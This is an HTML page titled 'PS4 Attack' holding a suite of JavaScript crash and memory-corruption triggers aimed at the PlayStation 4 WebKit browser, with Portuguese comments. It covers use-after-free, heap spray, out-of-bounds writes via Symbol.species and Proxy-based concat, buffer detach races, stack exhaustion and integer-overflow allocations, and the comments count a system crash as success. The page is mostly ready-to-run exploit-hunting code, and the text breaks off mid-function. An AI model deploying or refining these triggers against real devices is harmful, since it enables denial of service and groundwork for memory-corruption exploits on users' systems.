<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
   <title>PS4 Attack</title>
   </head>
<body>

  <h1>ATTACK SUITE</h1>

    <button onclick="startDOMRecursion()">HACKERONE TRIGGER CRASH</button>
    <button onclick="runStringAttack()">HACKERONE STRING FLATTENING</button>
    
    <button onclick="runBindChain()">STACK OVERFLOW Function.bind() Chain Reaction</button>	

    <button onclick="runMicrotaskBomb()">MEMORIA Promise Microtask Starvation</button>
    <button onclick="runReplaceBomb()">MEMORIA String.replace Calculation Overflow</button>
    <button onclick="run10_AllocPanic()">MEMORIA Bad Array New Length</button>
    <button onclick="runBadArrayLength()">MEMORIA Bad Array Length (Integer Overflow)</button>

    <button onclick="runSortCorruption()">TEST 1: Array Sort Memory Corruption (Crash)</button>
    <button onclick="runRegexReplaceCrash()">TEST 2: RegExp Replace UAF</button>
    <button onclick="runJSONConfusion()">TEST 3: JSON Serializer Confusion</button>
    <button onclick="runSpeciesOOB()">TEST 1: TypedArray Species OOB Write</button>
    <button onclick="runArgumentsCrash()">TEST 2: Arguments JIT Optimization Crash</button>
    <button onclick="runRopeUAF()">TEST 3: String Rope Read-After-Free</button>
    <button onclick="runImageDataOverflow()">TEST 1: ImageData Integer Overflow (Crash)</button>
    <button onclick="runIteratorDetach()">TEST 2: TypedArray Iterator Detach (UAF)</button>
    <button onclick="runRegexStackSmash()">TEST 3: RegExp Compiler Stack Smash</button>
    <button onclick="runZlibCrash()">TEST 1: DecompressionStream Buffer Overflow</button>
    <button onclick="runLocaleStack()">TEST 2: Intl.Locale Stack Smash</button>
    <button onclick="runConcatOOB()">TEST 3: Array.concat Spreadable Overflow</button>
    <button onclick="runTypedArrayDetach()">TEST 1: TypedArray.set Detach (Heap UAF)</button>
    <button onclick="runAudioRace()">TEST 2: AudioBuffer Thread Race (Audio Crash)</button>
    <button onclick="runCanvasRace()">TEST 3: Canvas toBlob Resize Race</button>
    <button onclick="runAssignCrash()">TEST 1: Object.assign Structure ID Corruption</button>
    <button onclick="runConcatCrash()">TEST 2: Array.concat Heap Overflow</button>
    <button onclick="runMapRehash()">TEST 3: Map Rehash Use-After-Free</button>
    <button onclick="runReduceRightOOB()">TEST 1: Array.reduceRight Detach (Heap OOB)</button>
    <button onclick="runApplySmash()">TEST 2: Function.apply Stack Smash</button>
    <button onclick="runDecoderCorruption()">TEST 3: TextDecoder State Corruption</button>
    <button onclick="runSortSuicide()">TEST 1: Array Sort Suicide (Use-After-Free)</button>
    <button onclick="runRegExpDestruction()">TEST 2: RegExp Input Destruction</button>
    <button onclick="runPortRace()">TEST 3 CRASH: MessagePort Transfer Race</button>
    <button onclick="runPortRace_Aggressive()">TEST 4 CRASH: MessagePort Transfer Race</button>
    <button onclick="runAudioParamCrash()">TEST 1: AudioParam Buffer Detach (Kernel UAF)</button>
    <button onclick="runSelectUAF()">TEST 2: Select Options Length UAF</button>
    <button onclick="runGridCrash()">TEST 3: CSS Grid Track Overflow</button>
    <button onclick="runStringOverflow()">TEST 1: String.repeat Integer Overflow</button>
    <button onclick="runSparseReverse()">TEST 2: Sparse Array Reverse (Memory Corruption)</button>
    <button onclick="runCSSFlood()">TEST 3: CSS Property Hash Collision/Overflow</button>
    <button onclick="runLocaleCompareCrash()">TEST 1: Locale Compare Stack Smash</button>
    <button onclick="runDateFormatCrash()">TEST 2: Date Format Buffer Overflow</button>
    <button onclick="runRegExpStateCrash()">TEST 3: RegExp Execution State Desync</button>
    <button onclick="runGCResurrection()">TEST 1: FinalizationRegistry UAF (GC Panic)</button>
    <button onclick="runCanvasStack()">TEST 2: Canvas Save() Stack Exhaustion</button>
    <button onclick="runReplaceReentrancy()">TEST 3: Node.replaceChild Reentrancy</button>
    <button onclick="runUnshiftOverflow()">TEST 1: Array.unshift Length Overflow</button>
    <button onclick="runCollatorRecursion()">TEST 2: Intl.Collator Infinite Recursion</button>
    <button onclick="runPortConfusion()">TEST 3: MessagePort Self-Transfer Loop</button>
    <button onclick="runXHRTypeConfusion()">TEST 1: XHR ResponseType Confusion (Heap Corruption)</button>
    <button onclick="runTrackRace()">TEST 2: TextTrack Cue Iterator UAF</button>
    <button onclick="runAdoptCrash()">TEST 3: AdoptNode Owner Mismatch</button>
    <button onclick="runCanvasOverflow()">TEST 1: Canvas getImageData Integer Overflow</button>
    <button onclick="runFirstLetterUAF()">TEST 2: CSS ::first-letter Layout UAF</button>
    <button onclick="runVideoErrorUAF()">TEST 3: Video Error Event UAF</button>


	
    <div id="log">Status: Aguardando testes...</div>
    <canvas id="c" width="100" height="100"></canvas>
    
    <div id="hidden-area" style="display:none;"></div>
    <div id="font-area" style="font-family: sans-serif;"></div>
    <canvas id="c_src" width="100" height="100" style="display:none;"></canvas>
    <canvas id="c_dst" width="100" height="100" style="display:none;"></canvas>
    <div id="sandbox" style="display:none;"></div>
    <div id="ax-root"></div>
    <div id="box" style="width:100px; height:100px; background:red; display:none;"></div>

    <script>
        function log(msg) {          
            let logElem = document.getElementById('log');
            logElem.innerText = `> ${msg}\n` + logElem.innerText;
        }

        // --- HACKERONE FUNCTIONS ---

        function startDOMRecursion() {
            log("Iniciando ataque de Profundidade DOM...");
            setTimeout(() => {
                try {
                    let root = document.createElement('div');
                    document.body.appendChild(root);
                    let count = 0;
                    
                    function dive() {
                        count++;
                        let child = document.createElement('div');
                        child.innerText = "."; 
                        root.appendChild(child);
                        root = child; 
                        
                        if (count % 1000 === 0) log(`Profundidade atual: ${count}`);
                        
                        dive(); 
                    }
                    dive();
                } catch (e) {
                    log("Erro capturado (Browser tentou proteger): " + e);
                    log("Tentando método alternativo (String Repeat)...");
                    document.body.innerHTML = "<div>".repeat(20000) + "</div>".repeat(20000);
                }
            }, 500);
        }

        function runStringAttack() {
            log("Fase 1: Criando Array Fragmentado...");
            setTimeout(() => {
                try {
                    var hugeArray = [];
                    var chunk = new Array(1024 * 1024).join("A"); 
                    
                    for(let i=0; i < 2000; i++) {
                        hugeArray.push(chunk);
                        if(i % 200 === 0) log("Alocado: " + i + "MB");
                    }

                    log("Fase 2: O ACHATAMENTO (The Flattening)...");
                    log("Atenção: O navegador deve travar agora.");

                    var flatString = hugeArray.join("");
                    log("Tamanho final: " + flatString.length);
                    var upper = flatString.toUpperCase(); 
                    
                } catch(e) {
                    log("Erro (Browser Protegeu): " + e.message);
                    log("Tentando Loop Infinito de Histórico como 'Plano B'...");
                    for(let i=0; i<100000; i++) {
                        history.pushState(0,0, i.toString());
                    }
                }
            }, 100);
        }

        // --- MEMORIA FUNCTIONS ---

	    function runBadArrayLength() {
            log("Testando Array Length Integer Overflow...");
            const sizes = [
                0xFFFFFFFF, 0x80000000, 0x7FFFFFFF, -1, 4294967295, 4294967296 
            ];
            sizes.forEach(size => {
                try {
                    log(`Tentando alocar Uint8Array(${size})...`);
                    let arr = new Uint8Array(size);
                    log("Alocado (Inesperado!)");
                } catch(e) {}
            });
            log("Teste de Array finalizado.");
        }

        function runMicrotaskBomb() {
            log("Iniciando Microtask Starvation (IPC Freeze)...");
            log("Aviso: A aba vai congelar. Observe o comportamento do botão PS.");
            let count = 0;
            function loop() {
                count++;
                Promise.resolve().then(loop);
                if (count % 100000 === 0) {
                    new Date().toString(); 
                }
            }
            loop();
        }

        function runReplaceBomb() {
            log("Armando String.replace Logic Bomb...");
            try {
                let str = "test";
                const re = /.*/; 
                for(let i=0; i<30; i++) { 
                    str = str.replace(re, "$&".repeat(2)); 
                    if (i % 5 === 0) log(`Nível ${i}: Length ~${str.length}`);
                }
                log("String final gerada (Seguro).");
            } catch(e) {
                log("Erro Replace (Provável OOM): " + e.message);
            }
        }

        function run10_AllocPanic() {
            log("[10] Testing Allocator Panic...");
            try {
                const arr = new ArrayBuffer(2147483647); // Max 32-bit signed
                log("Allocated (Unexpected).");
            } catch(e) { log("Alloc Error (Expected): " + e.message); }
        }

        // --- STACK OVERFLOW ---

        function runBindChain() {
            log("Criando cadeia Function.bind()...");
            try {
                let func = function() { return "pow"; };
                for (let i = 0; i < 50000; i++) {
                    func = func.bind(null);
                }
                log("Cadeia criada. Executando (Trigger)...");
                func();
                log("Bind Chain executada (Sem crash).");
            } catch(e) {
                log("Erro Bind: " + e.message);
                if (e.message.includes("stack")) {
                    log("SUCESSO: Stack Overflow via Bind Chain!");
                }
            }
        } 
function runSortCorruption() {
            log("Iniciando Sort Corruption...");
            
            try {
                // Cria um array grande o suficiente para ativar o QuickSort do C++
                const arr = [];
                for(let i=0; i<1000; i++) arr[i] = i;

                log("Array criado (1000 itens). Iniciando sort...");

                // A função de comparação é chamada centenas de vezes pelo C++
                arr.sort((a, b) => {
                    // Gatilho: Quando o sort estiver no meio do trabalho
                    if (a === 500 || b === 500) {
                        // ZERA o array. A memória original é marcada como livre.
                        arr.length = 0;
                        
                        // SPRAY: Aloca imediatamente outra coisa para ocupar o lugar
                        // Se o C++ continuar escrevendo, ele vai corromper ESTE novo array
                        const spray = new Float64Array(10000).fill(1.1);
                        
                        // Retorna 0 para dizer "são iguais", mantendo o C++ rodando
                        return 0;
                    }
                    return a - b;
                });

                // Se o navegador não crashou, verificamos o estado
                log("Sort terminou.");
                log("Array original length: " + arr.length);
                
                // Se arr.length for > 0 ou contiver lixo, houve corrupção
                if (arr.length > 0 && arr[0] === undefined) {
                    log("ALERTA: Array fantasma detectado!");
                }

            } catch(e) {
                // Se der erro de script, o motor se protegeu.
                // Se der TELA AZUL ou FECHAR o app, é SUCESSO.
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 2: RegExp Replace UAF ---
        // Tenta corromper a string de origem durante uma substituição global.
        function runRegexReplaceCrash() {
            log("Iniciando RegExp Replace UAF...");
            
            try {
                let str = "A".repeat(10000);
                const re = /A/g;
                
                // Objeto que será usado como "replacement"
                const evilReplace = {
                    toString: () => {
                        // A cada substituição, este código roda.
                        // Tenta invalidar a string original ou a regex
                        re.lastIndex = 0; // Reseta o índice no meio do loop
                        str = null; // Remove a referência
                        
                        // Tenta forçar GC
                        const junk = new Array(1000).fill("X");
                        return "B";
                    }
                };

                // Executa o replace
                // O motor C++ está iterando sobre 'str'.
                // O callback altera 're' e 'str'.
                String.prototype.replace.call(str, re, evilReplace);
                
                log("Replace terminou.");
            } catch(e) {
                log("Erro Regex: " + e.message);
            }
        }

        // --- TESTE 3: JSON Serializer Confusion ---
        // Tenta confundir o JSON.stringify usando um objeto que muda de identidade.
        function runJSONConfusion() {
            log("Testando JSON Serializer...");
            
            const target = {
                get a() {
                    // Quando o serializer lê 'a', deletamos 'b'
                    delete this.b;
                    // E colocamos um objeto grande em 'c' para mover a memória
                    this.c = new Array(1000).fill(1.1);
                    return 1;
                },
                b: 2,
                c: 3
            };

            try {
                // O JSON.stringify percorre as chaves em ordem.
                // Ele vê 'a', 'b', 'c'.
                // Lê 'a' -> roda nosso getter -> apaga 'b'.
                // O que acontece quando ele tenta ler 'b' que estava na lista inicial?
                const json = JSON.stringify(target);
                log("JSON gerado: " + json);
            } catch(e) {
                log("Erro JSON: " + e.message);
            }
        } 
function runSpeciesOOB() {
            log("Iniciando Ataque 'Species' (OOB Write)...");
            
            try {
                // Cria um array fonte cheio de 'A' (0x41)
                const source = new Uint8Array(1000).fill(0x41);
                
                // Define o construtor malicioso
                source.constructor = {
                    [Symbol.species]: function(len) {
                        // O WebKit pede um buffer de tamanho 'len' (1000)
                        // Nós retornamos um buffer MINÚSCULO (1 byte)
                        log(`Engine pediu buffer de tamanho ${len}. Retornando buffer de 1 byte...`);
                        return new Uint8Array(1); 
                    }
                };

                // O método 'map' usa 'species' para criar o destino.
                // Se o loop C++ usar o tamanho de 'source' (1000) para escrever no destino (1),
                // ele vai sobrescrever 999 bytes de memória vizinha (Heap Overflow).
                const result = source.map(x => x);
                
                log("Operação concluída (Se o browser não fechou, pode ter protegido).");
                log("Tamanho do resultado: " + result.length);
                
            } catch(e) {
                log("Erro (Mitigação Ativa): " + e.message);
            }
        }

        // --- TESTE 2: Arguments JIT Optimization Crash ---
        // Confunde a otimização de acesso à stack usando o objeto 'arguments'.
        function runArgumentsCrash() {
            log("Testando Arguments Type Confusion...");
            
            function confuse(arg) {
                // O compilador tenta otimizar o acesso a 'arguments[0]'
                // Nós mudamos a estrutura de 'arguments' deletando índices
                delete arguments[0];
                
                // Agora definimos uma propriedade getter na cadeia de protótipos
                Object.defineProperty(Object.prototype, "0", {
                    get: () => {
                        log("Getter na prototype chain ativado!");
                        // Tenta invalidar a stack frame atual
                        return 0xDEADBEEF;
                    },
                    configurable: true
                });
                
                // O acesso deve ser lento agora, mas se o JIT usou Fast Path, vai ler lixo
                return arguments[0];
            }

            // Treina o motor com chamadas normais
            for(let i=0; i<1000; i++) confuse(1);
            
            log("Executando acesso confuso...");
            const val = confuse(1);
            
            if (val === 0xDEADBEEF) {
                log("Comportamento Correto (Lento).");
            } else if (val === undefined) {
                log("Indefinido (Seguro).");
            } else {
                log(`ALERTA: Valor inesperado lido! ${val} (Possível leitura de Stack lixo)`);
            }
            
            delete Object.prototype["0"]; // Limpeza
        }

        // --- TESTE 3: String Rope Read-After-Free ---
        // Tenta ler uma string fragmentada enquanto forçamos o GC a destruí-la.
        function runRopeUAF() {
            log("Iniciando String Rope Stress...");
            
            let rope = "";
            const chunk = "1234567890";
            
            // Constrói uma Rope gigante (árvore de strings)
            for(let i=0; i<5000; i++) rope += chunk;
            
            // Cria um objeto que tenta acessar a string quando convertido
            const observer = {
                toString: () => {
                    // Tenta acessar um caractere da rope
                    // Se a rope foi movida/achatada incorretamente, pode ler lixo
                    return rope.charAt(100);
                }
            };
            
            try {
                log("Forçando achatamento com observador...");
                
                // O replace força a conversão/leitura da string
                // Passamos 'observer' como argumento, forçando interação JS<->C++
                String.prototype.replace.call(rope, /1/, observer);
                
                log("Teste Rope finalizado.");
            } catch(e) {
                log("Erro: " + e.message);
            }
        }
 function runImageDataOverflow() {
            log("Iniciando ImageData Math Attack...");
            
            try {
                // Valores críticos para 32-bit (0xFFFFFFFF)
                // 1073741824 * 4 = 0 (Overflow exato)
                // Vamos tentar valores próximos para enganar a validação
                const targets = [
                    { w: 1073741824, h: 1 }, // 4GB exato
                    { w: 32768, h: 32768 },  // 1GB pixels -> 4GB bytes
                    { w: 65536, h: 65536 },  // 4GB pixels -> 16GB bytes (Overflow certo se não checado)
                    { w: 23170, h: 23170 }   // ~2GB bytes
                ];

                targets.forEach((t, i) => {
                    try {
                        log(`Tentativa ${i}: ${t.w} x ${t.h}...`);
                        // O construtor pode lançar IndexSizeError (Seguro)
                        // Se passar e o cálculo estiver errado -> Heap Corruption
                        const img = new ImageData(t.w, t.h);
                        log("ALERTA: ImageData criado! Verifique estabilidade.");
                        
                        // Tenta acessar o buffer (pode crashar se o tamanho for falso)
                        const len = img.data.length;
                        log("Buffer Length reportado: " + len);
                        
                    } catch(e) {
                        // Erro esperado se a proteção funcionar
                    }
                });
                
                log("Teste ImageData finalizado.");

            } catch(e) {
                log("Erro Fatal: " + e.message);
            }
        }

        // --- TESTE 2: TypedArray Iterator Detach ---
        // Usa um iterador malicioso para confundir a construção de um TypedArray.
        // Tenta mudar a memória subjacente durante a cópia.
        function runIteratorDetach() {
            log("Iniciando Iterator Detach Attack...");
            
            try {
                const kSize = 1024;
                let detached = false;
                
                // Buffer que será a fonte (ou alvo de confusão)
                const buffer = new ArrayBuffer(kSize);
                const view = new Uint8Array(buffer);
                
                // Iterador malicioso
                const iterable = {
                    [Symbol.iterator]() {
                        let step = 0;
                        return {
                            next() {
                                step++;
                                if (step === 10) {
                                    log("Trigger no passo 10! Tentando 'Detach'...");
                                    // Tenta "roubar" o buffer (Neutering) transferindo para um Worker
                                    try {
                                        const w = new Worker(URL.createObjectURL(new Blob([""], {type: "text/javascript"})));
                                        w.postMessage(buffer, [buffer]);
                                        w.terminate();
                                        detached = true;
                                        log("Buffer transferido (Neutered).");
                                    } catch(e) { log("Falha no Detach: " + e.message); }
                                }
                                
                                if (step > 100) return { done: true };
                                return { value: 0x41, done: false };
                            }
                        };
                    }
                };

                log("Executando Uint8Array.from()...");
                // O C++ começa a copiar valores do iterador para o novo array.
                // Se o iterador invalidar a memória global, o C++ pode crashar.
                const res = Uint8Array.from(iterable);
                
                log("Operação concluída.");
                if (detached && buffer.byteLength === 0) {
                    log("Estado: Buffer foi desanexado com sucesso durante o loop.");
                }

            } catch(e) {
                log("Erro Iterator: " + e.message);
            }
        }

        // --- TESTE 3: RegExp Compiler Stack Smash ---
        // Cria uma Regex com profundidade absurda para estourar a stack do compilador JIT/Yarr.
        function runRegexStackSmash() {
            log("Iniciando RegExp Stack Bomb...");
            
            setTimeout(() => {
                try {
                    // O WebKit costuma aguentar alguns milhares, mas 50.000 é brutal.
                    const depth = 50000;
                    log(`Gerando padrão com profundidade ${depth}...`);
                    
                    // Gera "((((....))))"
                    const pattern = "(".repeat(depth) + "A" + ")".repeat(depth);
                    
                    log("Compilando RegExp (Isso pode crashar a aba)...");
                    // O crash acontece AQUI, na compilação
                    const re = new RegExp(pattern);
                    
                    log("Executando match...");
                    re.test("A");
                    
                    log("RegExp sobreviveu.");
                    
                } catch(e) {
                    log("Erro RegExp (Provável Stack Overflow protegido): " + e.message);
                }
            }, 100);
        }
 // --- TESTE 1: DecompressionStream Buffer Overflow ---
        // Ataca a implementação 'inflate' encontrada no 1200.elf.
        // Envia um stream gzip malformado que tenta enganar o alocador.
        async function runZlibCrash() {
            log("Iniciando ataque ao zlib (inflate)...");
            
            if (!window.DecompressionStream) {
                log("API DecompressionStream não suportada.");
                return;
            }

            try {
                // 1. Cria um payload comprimido válido (header gzip)
                // Header mínimo gzip: 1F 8B 08 00 ...
                const header = [0x1f, 0x8b, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00];
                
                // 2. Adiciona um bloco de dados "mentiroso"
                // Tenta dizer que o bloco tem tamanho X mas fornece Y
                const badBlock = new Uint8Array(1024 * 1024).fill(0x41); // 1MB de dados
                
                const payload = new Uint8Array([...header, ...badBlock]);
                
                // 3. Cria o stream
                const ds = new DecompressionStream("gzip");
                const writer = ds.writable.getWriter();
                const reader = ds.readable.getReader();
                
                log("Escrevendo dados maliciosos no descodificador...");
                writer.write(payload);
                
                // Tenta ler. Se o 'inflate' C++ não validar os limites internos, crash.
                while (true) {
                    const { done, value } = await reader.read();
                    if (done) break;
                    log("Lidos " + value.length + " bytes (Sem crash).");
                }
                log("Zlib sobreviveu.");

            } catch(e) {
                log("Erro Zlib: " + e.message);
            }
        }

        // --- TESTE 2: Intl.Locale Stack Smash ---
        // Ataca o parser de strings de localização da libc.
        // Cria uma string de locale absurdamente complexa e profunda.
        function runLocaleStack() {
            log("Atacando Parser de Locale (libc)...");
            
            try {
                // Constrói um locale com milhares de extensões unicode (-u-...)
                // O parser C++ muitas vezes usa recursão para processar subtags.
                let toxicLocale = "en";
                const subtag = "-u-ca-gregory";
                
                // 10.000 repetições = ~150KB de string de locale
                // Isso é muito maior do que qualquer buffer de pilha razoável (geralmente 4KB ou 64KB)
                for(let i=0; i<10000; i++) {
                    toxicLocale += subtag + i; // Torna único para evitar cache
                }
                
                log(`Gerado locale de tamanho: ${toxicLocale.length}`);
                log("Instanciando Intl.Locale...");
                
                // O Crash deve ocorrer aqui, dentro do construtor C++
                const loc = new Intl.Locale(toxicLocale);
                
                log("Parser sobreviveu. BaseName: " + loc.baseName.substring(0, 50) + "...");
                
            } catch(e) {
                // RangeError é a defesa do JS. Estamos procurando o Crash (tela azul/fechar).
                log("Erro Locale: " + e.message);
            }
        }

        // --- TESTE 3: Array.concat Spreadable Overflow ---
        // Ataca o cálculo de tamanho do Array.concat.
        // Usa um Proxy para mentir sobre o tamanho e conteúdo durante a concatenação.
        function runConcatOOB() {
            log("Iniciando Array.concat Type Confusion...");
            
            try {
                // Array alvo
                const target = [1.1];
                
                // Objeto malicioso que finge ser um array espalhável
                const proxy = new Proxy({}, {
                    get(target, prop) {
                        if (prop === Symbol.isConcatSpreadable) return true;
                        
                        if (prop === "length") {
                            log("Engine leu length. Retornando tamanho gigante...");
                            // Retorna um tamanho que pode causar overflow se somado ao target
                            // Em 32-bit: 0xFFFFFFFF
                            return 4294967295; 
                        }
                        
                        if (prop === "0") {
                            log("Engine leu índice 0.");
                            return 0x41414141;
                        }
                        
                        return undefined;
                    },
                    has(target, prop) { return true; } // Finge ter todas as propriedades
                });

                log("Executando concat()...");
                
                // O 'concat' tenta alocar um novo array com tamanho = target.length + proxy.length
                // Se houver Integer Overflow, ele aloca pouco.
                // Depois tenta copiar os itens. Se não verificar limites, escreve fora.
                const res = target.concat(proxy);
                
                log("Concat terminou (Sem Crash). Length: " + res.length);
                
            } catch(e) {
                // "Out of memory" ou "Invalid array length" são bons sinais.
                // Crash é o objetivo.
                log("Erro Concat: " + e.message);
            }
        } 
 function runTypedArrayDetach() {
            log("Iniciando TypedArray.set Detach...");
            
            try {
                const size = 1024 * 1024 * 10; // 10MB
                const target = new Uint8Array(size);
                
                // Objeto fonte malicioso
                const source = {
                    length: size,
                    get 0() {
                        // O primeiro acesso dispara o ataque
                        log("C++ começou a ler. Transferindo buffer...");
                        
                        try {
                            // Neutra o alvo transferindo para um Worker morto
                            const w = new Worker(URL.createObjectURL(new Blob([""], {type: "text/javascript"})));
                            w.postMessage(target.buffer, [target.buffer]);
                            w.terminate();
                            
                            log("Buffer 'target' neutralizado.");
                        } catch(e) { log("Falha no detach: " + e); }
                        
                        return 0x41;
                    }
                };

                // A operação 'set' deve ser otimizada em C++.
                // Se ela não checar se 'target.buffer' ainda é válido a cada byte, escreve no lixo.
                log("Executando target.set(source)...");
                target.set(source);
                
                log("Operação sobreviveu (Buffer Length: " + target.byteLength + ")");
                
            } catch(e) {
                log("Erro (Browser Protegeu): " + e.message);
            }
        }

        // --- TESTE 2: AudioBuffer Thread Race (Audio Crash) ---
        // Cria uma condição de corrida entre a thread de áudio (Kernel/Hardware) e a thread JS.
        function runAudioRace() {
            log("Iniciando Audio Thread Race...");
            
            try {
                // 1. Configura o áudio
                const ctx = new (window.AudioContext || window.webkitAudioContext)();
                const frames = 44100; // 1 segundo
                const channels = 2;
                
                // Cria um buffer de áudio
                const audioBuf = ctx.createBuffer(channels, frames, 44100);
                
                // Enche com ruído
                for (let i = 0; i < channels; i++) {
                    const data = audioBuf.getChannelData(i);
                    for (let j = 0; j < frames; j++) data[j] = Math.random();
                }

                // 2. Prepara o Worker para roubar a memória
                // Nota: AudioBuffers não são transferíveis diretamente em specs antigas,
                // mas podemos tentar transferir os ArrayBuffers internos dos canais.
                const w = new Worker(URL.createObjectURL(new Blob([""], {type: "text/javascript"})));

                // 3. O GOLPE: Toca e transfere simultaneamente
                const src = ctx.createBufferSource();
                src.buffer = audioBuf;
                src.connect(ctx.destination);
                
                log("Iniciando reprodução...");
                src.start();
                
                // Tenta transferir os dados subjacentes imediatamente
                // Isso tenta puxar o tapete da thread de áudio
                try {
                    // A API Web Audio antiga pode permitir acesso direto ao buffer
                    const rawData = audioBuf.getChannelData(0).buffer;
                    w.postMessage(rawData, [rawData]);
                    log("Buffer de canal transferido enquanto toca!");
                } catch(e) {
                    log("Transferência bloqueada: " + e.message);
                }
                
                // Estressa a CPU para aumentar a chance de colisão
                let x = 0;
                for(let k=0; k<1000000; k++) x += Math.sqrt(k);

            } catch(e) {
                log("Erro Audio: " + e.message);
            }
        }

        // --- TESTE 3: Canvas toBlob Resize Race ---
        // Ataca o encoder de imagem assíncrono.
        function runCanvasRace() {
            log("Iniciando Canvas toBlob Race...");
            
            const canvas = document.getElementById('c');
            const ctx = canvas.getContext('2d');
            
            // Desenha algo pesado (ruído)
            const id = ctx.createImageData(4000, 4000);
            for(let i=0; i<id.data.length; i+=4) id.data[i] = 255;
            ctx.putImageData(id, 0, 0);
            
            // Loop de tentativa de Race
            let attempts = 0;
            const interval = setInterval(() => {
                attempts++;
                if (attempts > 20) {
                    clearInterval(interval);
                    log("Teste Canvas finalizado.");
                    return;
                }

                // 1. Inicia a codificação (Assíncrono)
                canvas.toBlob(function(blob) {
                    // Callback (pode nunca ser chamado se crashar antes)
                }, 'image/jpeg', 0.95);
                
                // 2. O GOLPE: Redimensiona imediatamente (Liberta memória de pixels)
                // Tenta acertar o momento em que o encoder está lendo os pixels
                canvas.width = 0;
                canvas.width = 4000; // Restaura para a próxima tentativa
                
                // Redesenha (para ter memória para libertar na próxima)
                ctx.fillRect(0,0,100,100); 
                
                if (attempts % 5 === 0) log("Tentativa " + attempts + "...");
                
            }, 100);
        }
 function runAssignCrash() {
            log("Iniciando Object.assign Attack...");
            
            try {
                const target = {};
                // Cria uma estrutura inicial para o destino (treina o motor)
                for (let i = 0; i < 100; i++) target["p" + i] = i;
                
                const source = new Proxy({}, {
                    ownKeys: function() {
                        return ['a', 'b', 'c'];
                    },
                    getOwnPropertyDescriptor: function() {
                        return { configurable: true, enumerable: true };
                    },
                    get: function(t, prop) {
                        if (prop === 'b') {
                            log("Getter 'b' acionado. Destruindo estrutura do alvo...");
                            // O GOLPE: Apaga todas as propriedades do destino
                            // Isso muda o StructureID e encolhe o objeto
                            for (let i = 0; i < 100; i++) delete target["p" + i];
                            
                            // Tenta forçar compactação do Garbage Collector
                            const junk = new Array(5000).fill(1.1);
                        }
                        return 0x41414141; // Valor marcador
                    }
                });

                log("Executando Object.assign...");
                // Se o C++ calculou o offset de escrita para 'c' baseada na estrutura antiga,
                // ele vai escrever 0x41414141 em memória não alocada.
                Object.assign(target, source);
                
                log("Operação sobreviveu (Verifique integridade).");
                
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 2: Array.concat Heap Overflow ---
        // Explora o cálculo de tamanho do concat com objetos 'spreadable'.
        function runConcatCrash() {
            log("Iniciando Array.concat Overflow...");
            
            try {
                const target = [];
                // Objeto que finge ser um array gigante
                const badSpreadable = {
                    [Symbol.isConcatSpreadable]: true,
                    length: 0xFFFFFFFF, // Tamanho máximo 32-bit
                    0: 1,
                    1: 2
                };

                log("Concatenando array gigante...");
                
                // Se o motor somar target.length (0) + badSpreadable.length (4GB),
                // e ocorrer Integer Overflow, ele pode alocar um buffer pequeno.
                // Mas se o loop de cópia tentar ler até 4GB, crasha.
                const res = target.concat(badSpreadable);
                
                log("Concat finalizado. Length: " + res.length);
                
            } catch(e) {
                log("Erro Concat (Provável OOM): " + e.message);
            }
        }

        // --- TESTE 3: Map Rehash Use-After-Free ---
        // Força o redimensionamento da tabela interna do Map durante a iteração.
        function runMapRehash() {
            log("Iniciando Map Rehash UAF...");
            
            try {
                const map = new Map();
                const count = 10000; // Quantidade suficiente para forçar rehash
                
                // Enche o mapa
                for (let i = 0; i < count; i++) map.set(i, i);
                
                log("Map cheio. Iterando e modificando...");
                
                let idx = 0;
                for (const [key, val] of map) {
                    idx++;
                    // No meio da iteração, deleta tudo e adiciona novos
                    // Isso força a liberação da tabela antiga e alocação de uma nova
                    if (idx === 100) {
                        log("Trigger! Limpando e recriando...");
                        map.clear();
                        
                        // Adiciona novos itens para ocupar a memória
                        for (let j = 0; j < 100; j++) map.set("new"+j, j);
                        
                        // O iterador C++ ainda tem o ponteiro para a tabela antiga?
                    }
                }
                
                log("Iteração sobreviveu.");
                
            } catch(e) {
                log("Erro Map: " + e.message);
            }
        }
function runReduceRightOOB() {
            log("Iniciando reduceRight OOB Attack...");
            
            try {
                // Array com dados conhecidos
                const arr = [1, 2, 3, 4, 5];
                let leaked = [];

                // O reduceRight vai do índice 4 até 0.
                arr.reduceRight((acc, val, index) => {
                    log(`Visitando índice ${index}...`);
                    
                    // O GOLPE: No primeiro passo (índice 4), zeramos o array.
                    if (index === 4) {
                        log("Detaching array (Length = 0)...");
                        arr.length = 0;
                        
                        // Tenta preencher o espaço liberado com lixo para detetar leitura
                        try { arr.push(0x41414141); } catch(e){}
                    }
                    
                    // Se o motor continuar o loop para 3, 2, 1...
                    // Mas o array está vazio, ele vai ler o que?
                    // Se ler undefined, é seguro. Se ler o nosso 0x41414141 ou outro valor, é OOB.
                    if (index < 4 && val !== undefined) {
                        log(`ALERTA: Leitura OOB no índice ${index}! Valor: ${val}`);
                        leaked.push(val);
                    }
                    
                    return val;
                }, 0);
                
                if (leaked.length > 0) {
                    log("Vulnerabilidade Confirmada: Leu dados após esvaziar.");
                } else {
                    log("Operação finalizada (Seguro - Loop parou ou leu undefined).");
                }

            } catch(e) {
                log("Erro (Motor Protegeu): " + e.message);
            }
        }

        // --- TESTE 2: Function.apply Stack Smash ---
        // Tenta estourar a Stack empurrando argumentos demais de uma só vez.
        function runApplySmash() {
            log("Iniciando Apply Stack Smash...");
            
            try {
                // Cria um array gigante (500.000 itens)
                // O tamanho da stack no PS4 é limitado (geralmente 1MB ou menos para a thread principal)
                const hugeArgs = new Array(500000).fill(1);
                
                function target() {
                    return "Sobrevivi";
                }
                
                log(`Executando target.apply com ${hugeArgs.length} argumentos...`);
                
                // O GOLPE: O motor tem que copiar cada item para a Stack C++.
                // Se não houver verificação de limite, a Stack atropela o Heap ou outras threads.
                target.apply(null, hugeArgs);
                
                log("Stack aguentou a carga.");
                
            } catch(e) {
                // RangeError é o esperado se o JS pegar.
                // Crash (tela azul/fechar) é o objetivo se o C++ pegar.
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 3: TextDecoder State Corruption ---
        // Ataca a máquina de estados do descodificador de texto da libc.
        function runDecoderCorruption() {
            log("Iniciando TextDecoder State Fuzzing...");
            
            try {
                const decoder = new TextDecoder("utf-8", {fatal: true});
                
                // Sequência inválida (Início de 3 bytes, mas só tem 1)
                const badChunk = new Uint8Array([0xE2]); 
                
                // Enche o buffer interno com estado pendente
                log("Enchendo buffer de estado...");
                for(let i=0; i<1000; i++) {
                    try {
                        decoder.decode(badChunk, {stream: true});
